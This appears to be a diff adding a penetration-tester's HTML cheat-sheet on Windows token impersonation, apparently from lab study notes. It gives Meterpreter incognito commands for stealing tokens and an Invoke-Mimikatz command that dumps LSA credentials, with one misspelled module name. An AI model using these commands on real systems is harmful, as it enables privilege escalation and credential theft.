@@ -1,0 +1,19 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Token Impersonation</title>
+</head><body><span style="font-size: 16pt">Checking Token Impersonation Priv<br/>
+&gt;whoami /priv		OR		meterpreter&gt; getprivs<ul><li style="list-style-type: none">-need option SeImpersonatePrivilege 	Enabled</li>
+</ul>
+<br/>
+<br/>
+<br/>
+Meterpreter Token Impersonation<br/>
+</span><span style="font-size: 14pt">meterpreter&gt; load incognito<br/>
+meterpreter&gt; list_tokens -u<br/>
+meterpreter&gt; whoami  &lt;---<br/>
+</span><span style="font-size: 14pt">meterpreter&gt; impersonate_token &lt;whoami response&gt;</span><span style="font-size: 16pt"><br/>
+</span><span style="font-size: 16pt"><br/>
+<br/>
+Mimikatz<br/>
+</span><span style="font-size: 16pt">C:\&gt; </span><span style="font-size: 14pt">Invoke-Mimikatz -Command '&quot;privledge::debug&quot; &quot;LSADump::LSA /inject&quot; exit' -Computer HYDRA.marvel.local</span></body></html>
